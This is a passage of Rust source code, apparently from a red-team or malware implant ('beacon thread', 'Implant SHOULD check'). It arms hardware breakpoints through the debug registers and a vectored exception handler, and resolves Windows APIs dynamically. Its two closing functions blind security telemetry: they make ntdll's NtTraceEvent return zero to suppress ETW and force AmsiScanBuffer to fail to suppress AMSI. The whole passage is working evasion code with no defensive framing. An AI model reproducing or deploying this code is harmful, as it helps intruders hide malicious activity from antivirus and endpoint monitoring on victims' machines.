        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler"))
    {
        Some(a) => a,
        None => return Err("AVEH unresolved"),
    };
    diag(b'x');
    type AddVEH = unsafe extern "system" fn(
        usize, unsafe extern "system" fn(usize) -> i32,
    ) -> *mut core::ffi::c_void;
    let f: AddVEH = core::mem::transmute(addr);
    diag(b'y');
    let handle = f(1, hwbp_veh_handler);
    diag(b'z');
    if handle.is_null() {
        diag(b'E');
        return Err("AddVectoredExceptionHandler failed");
    }
    VEH_HANDLE.store(handle, core::sync::atomic::Ordering::Release);
    diag(b'e');
    Ok(())
}

/// Allocate a page-aligned CONTEXT buffer via VirtualAlloc and zero it.
unsafe fn alloc_ctx_buf() -> Result<usize, &'static str> {
    let va_addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    {
        Some(a) => a,
        None => return Err("VirtualAlloc unresolved"),
    };
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void, usize, u32, u32,
    ) -> *mut core::ffi::c_void;
    let vaf: VAlloc = core::mem::transmute(va_addr);
    let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if ctx_buf.is_null() {
        return Err("VirtualAlloc for CONTEXT failed");
    }
    core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);
    Ok(ctx_buf as usize)
}

/// Capture current thread context, configure DRn for `target_addr` at `slot`,
/// set DR7 for an execute breakpoint, and apply via NtSetContextThread.
/// Frees `ctx_buf` on both success and failure paths.
unsafe fn configure_dr_slot(
    base: usize,
    slot: usize,
    target_addr: usize,
    ntgct: unsafe extern "system" fn(usize, usize) -> i32,
    ntsct: unsafe extern "system" fn(usize, usize) -> i32,
    ctx_buf: *mut core::ffi::c_void,
) -> Result<u64, &'static str> {
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_FULL_AMD64);
    diag(b'g');
    let st = ntgct(NT_CURRENT_THREAD, base);
    if st < 0 {
        free_ctx_buf(ctx_buf);
        diag(b'I');
        return Err("NtGetContextThread failed");
    }
    diag(b'h');

    let original_dr7 = ctx_read_u64_at(base, CTX_DR7);
    vehtag(b'O');

    // Set DRn = target_addr (DR0 at offset 0x048, then +8 per slot).
    ctx_write_u64_at(base, CTX_DR0 + slot * 8, target_addr as u64);
    ctx_write_u64_at(base, CTX_DR6, 0);

    // Configure DR7 for execute breakpoint: clear this slot's bits, set L.
    let mut new_dr7 = original_dr7;
    new_dr7 &= !(0x3u64 << (slot * 2));          // clear L + G
    new_dr7 &= !(0xFu64 << (16 + slot * 4));      // clear R/W + LEN
    new_dr7 |= 1u64 << (slot * 2);                // set L (local enable)
    ctx_write_u64_at(base, CTX_DR7, new_dr7);
    diag(b'i');

    // Apply: write only debug registers via NtSetContextThread.
    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
    let st2 = ntsct(NT_CURRENT_THREAD, base);
    free_ctx_buf(ctx_buf);
    if st2 < 0 {
        diag(b'K');
        return Err("NtSetContextThread failed");
    }
    diag(b'j');
    Ok(original_dr7)
}

// ── add_hwbp orchestrator ──────────────────────────────────────────────────

/// Arm a hardware breakpoint at `target_addr` on the current thread. The HWBP
/// fires once per execution of the target instruction (STATUS_SINGLE_STEP),
/// which the VEH handler catches and redirects to the shadow stub.
///
/// Returns the 0-based DR slot number (0–3) on success.
/// Returns `Err` if no free slot, the VEH chain is compromised, or any
/// NT API call fails. The caller must call [`remove_hwbp`] to disarm.
pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<usize, &'static str> {
    diag(b'a');

    // 0. Preconditions.
    if SHADOW_BUF.load(core::sync::atomic::Ordering::Acquire).is_null() {
        diag(b'1');
        return Err("shadow buffer not initialized");
    }
    let shadow = match shadow_addr(shadow_type) {
        Some(s) => s,
        None => { diag(b'2'); return Err("invalid shadow type"); }
    };
    diag(b'b');

    // 1. Claim a free HWBP slot.
    let slot = match claim_slot() {
        Ok(s) => s,
        Err(e) => { diag(b'3'); return Err(e); }
    };
    diag(b'c');

    // Release slot on any early-exit below.
    let release = |s: usize, tag: u8, err: &'static str| -> Result<usize, &'static str> {
        HWBP_SLOT_STATE[s].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
        diag(tag);
        Err(err)
    };

    // 2. Resolve NT context functions.
    let (ntgct, ntsct) = match resolve_nt_context_fns() {
        Ok(f) => f,
        Err(e) => {
            let tag = if e.contains("Get") { b'H' } else { b'J' };
            return release(slot, tag, e);
        }
    };

    // 3. Register VEH once (must be before breakpoints).
    if let Err(e) = register_veh_once(slot) {
        return release(slot, b'D', e);
    }

    // 4. Allocate CONTEXT buffer.
    let base = match alloc_ctx_buf() {
        Ok(b) => b,
        Err(e) => return release(slot, b'F', e),
    };
    let ctx_buf = base as *mut core::ffi::c_void;
    diag(b'f');

    // 5. Configure DR registers for the execute breakpoint.
    let original_dr7 = match configure_dr_slot(base, slot, target_addr, ntgct, ntsct, ctx_buf) {
        Ok(dr7) => dr7,
        Err(e) => return release(slot, b'K', e),
    };

    // 6. Publish the armed entry: write pool cell, then flip CLAIMED→OCCUPIED.
    let cell_ptr: *mut HwbpEntry = HWBP_POOL[slot].get();
    core::ptr::write(cell_ptr, HwbpEntry { target: target_addr, shadow, original_dr7 });
    HWBP_SLOT_STATE[slot].store(SLOT_OCCUPIED, core::sync::atomic::Ordering::Release);
    HWBP_COUNT.fetch_add(1, core::sync::atomic::Ordering::Release);
    diag(b'k');
    Ok(slot)
}

/// Remove a hardware breakpoint and restore the original DR7.
///
/// # Disarming protocol (CRITICAL-6/7)
///
/// 1. Atomically claim the slot OCCUPIED→CLAIMED via CAS. The VEH now skips
///    this slot (it only acts on OCCUPIED), so any in-flight #DB for it is
///    correctly passed through as "not ours".
/// 2. Decrement the live count.
/// 3. Publish VACANT (Release) so a future add_hwbp can reclaim the slot.
/// 4. Disarm the DR register via NtSetContextThread (clear L/RW/LEN + DRx).
///    Once disarmed, no new #DB can fire from this slot on this thread.
/// 5. If the live count reached zero, remove the VEH handler.
///
/// Because the beacon thread is the sole faulting thread for local-enable
/// HWBPs, and `remove_hwbp` runs on the beacon thread, there is no window
/// where this thread is both executing the target address and inside
/// `remove_hwbp`. The CAS+VACANT sequence makes the teardown safe even if
/// that assumption is ever violated by a global-enable (G bit) breakpoint.
pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
    if slot >= 4 {
        return Err("invalid slot");
    }
    // Atomically claim the slot for teardown: OCCUPIED→CLAIMED. If the CAS
    // fails the slot wasn't armed (or another remover raced us); treat both
    // as "invalid slot" so the caller knows nothing was removed.
    let prev = HWBP_SLOT_STATE[slot].compare_exchange(
        SLOT_OCCUPIED,
        SLOT_CLAIMED,
        core::sync::atomic::Ordering::Acquire,
        core::sync::atomic::Ordering::Relaxed,
    );
    if prev.is_err() {
        return Err("invalid slot");
    }

    // Read out the saved entry. The read documents that the cell is now ours;
    // original_dr7 is applied implicitly via DR7 bit-clearing below.
    // SAFETY: slot is CLAIMED (we just won the CAS), so we are the sole
    // accessor of this cell.
    let _entry: HwbpEntry = core::ptr::read(HWBP_POOL[slot].get());

    HWBP_COUNT.fetch_sub(1, core::sync::atomic::Ordering::Release);

    // Publish VACANT so the VEH skips this slot from now on and a future
    // add_hwbp can reclaim it.
    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);

    // Allocate CONTEXT buffer.
    let va_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
        .ok_or("VirtualAlloc unresolved")?;
    type VAlloc = unsafe extern "system" fn(
        *mut core::ffi::c_void,
        usize,
        u32,
        u32,
    ) -> *mut core::ffi::c_void;
    let vaf: VAlloc = core::mem::transmute(va_addr);
    let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
    if ctx_buf.is_null() {
        return Err("VirtualAlloc for CONTEXT failed");
    }
    let base = ctx_buf as usize;
    // SAFETY: freshly-allocated 1232-byte RW buffer we own.
    core::ptr::write_bytes(ctx_buf as *mut u8, 0, 1232);

    ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);

    type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
    let ntgct: FnCtx = core::mem::transmute(
        crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread")
            .ok_or("NtGetContextThread unresolved")?,
    );
    if ntgct(NT_CURRENT_THREAD, base) >= 0 {
        // Clear the slot-specific DRx register and DR6.
        ctx_write_u64_at(base, CTX_DR0 + slot * 8, 0);
        ctx_write_u64_at(base, CTX_DR6, 0);

        // Clear only this slot's bits in DR7 — restoring the full original_dr7
        // is unsafe when other slots are active (it would clobber their L/RW/LEN bits).
        let cur_dr7 = ctx_read_u64_at(base, CTX_DR7);
        let mut dr7 = cur_dr7;
        // Clear L and G for this slot
        dr7 &= !(0x3u64 << (slot * 2));
        // Clear R/W and LEN for this slot
        dr7 &= !(0xFu64 << (16 + slot * 4));
        ctx_write_u64_at(base, CTX_DR7, dr7);
        ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
        let ntsct: FnCtx = core::mem::transmute(
            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")
                .ok_or("NtSetContextThread unresolved")?,
        );
        let _ = ntsct(NT_CURRENT_THREAD, base);
    }

    free_ctx_buf(ctx_buf);

    // Remove VEH when no more breakpoints are active. Load the count with
    // Acquire (paired with the fetch_sub Release above); if zero, swap the
    // handle out (AcqRel) and call RemoveVectoredExceptionHandler. The swap
    // prevents double-removal by concurrent callers.
    if HWBP_COUNT.load(core::sync::atomic::Ordering::Acquire) == 0 {
        let handle = VEH_HANDLE.swap(core::ptr::null_mut(), core::sync::atomic::Ordering::AcqRel);
        if !handle.is_null() {
            if let Some(a) =
                crate::resolve::export_addr(b"kernelbase.dll", b"RemoveVectoredExceptionHandler")
                    .or_else(|| {
                        crate::resolve::export_addr(
                            b"kernel32.dll",
                            b"RemoveVectoredExceptionHandler",
                        )
                    })
            {
                type RemoveVEH = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
                let f: RemoveVEH = core::mem::transmute(a);
                f(handle);
            } else {
                // Could not resolve the remover — put the handle back so a
                // future remove_hwbp can retry. (The VEH stays registered,
                // which is harmless: it does nothing for vacant slots.)
                VEH_HANDLE.store(handle, core::sync::atomic::Ordering::Release);
            }
        }
    }
    Ok(())
}

/// Free a VirtualAlloc'd context buffer.
unsafe fn free_ctx_buf(buf: *mut core::ffi::c_void) {
    if let Some(vf_addr) = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualFree")
        .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree"))
    {
        type VFree = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32) -> i32;
        let vff: VFree = core::mem::transmute(vf_addr);
        // SAFETY: buf was returned by VirtualAlloc with MEM_RESERVE|COMMIT;
        // MEM_RELEASE (0x8000) with size 0 frees the entire region.
        vff(buf, 0, 0x8000); // MEM_RELEASE
    }
}

pub fn active_count() -> usize {
    HWBP_COUNT.load(core::sync::atomic::Ordering::Acquire)
}

pub fn is_ready() -> bool {
    !SHADOW_BUF
        .load(core::sync::atomic::Ordering::Acquire)
        .is_null()
}

/// Returns true if the VEH chain was found clean during probe.
/// Implant SHOULD check this before relying on HWBP-based patches;
/// if false, fall back to byte-patch mode.
pub fn is_veh_safe() -> bool {
    VEH_SAFE.load(core::sync::atomic::Ordering::Acquire)
}

/// Set HWBP on `ntdll!NtTraceEvent` → shadow returns 0 (ETW suppressed).
pub unsafe fn blind_etw_hwbp() -> Result<usize, &'static str> {
    let addr = crate::resolve::export_addr(b"ntdll.dll", b"NtTraceEvent")
        .ok_or("NtTraceEvent unresolved")?;
    add_hwbp(addr, ShadowType::EtwEaxZero)
}

/// Set HWBP on `amsi!AmsiScanBuffer` → shadow returns E_INVALIDARG (AMSI suppressed).
pub unsafe fn blind_amsi_hwbp() -> Result<usize, &'static str> {
    let addr =
        crate::resolve::export_addr(b"amsi.dll", b"AmsiScanBuffer").ok_or("amsi not loaded")?;
    add_hwbp(addr, ShadowType::AmsiInvalidArg)
}
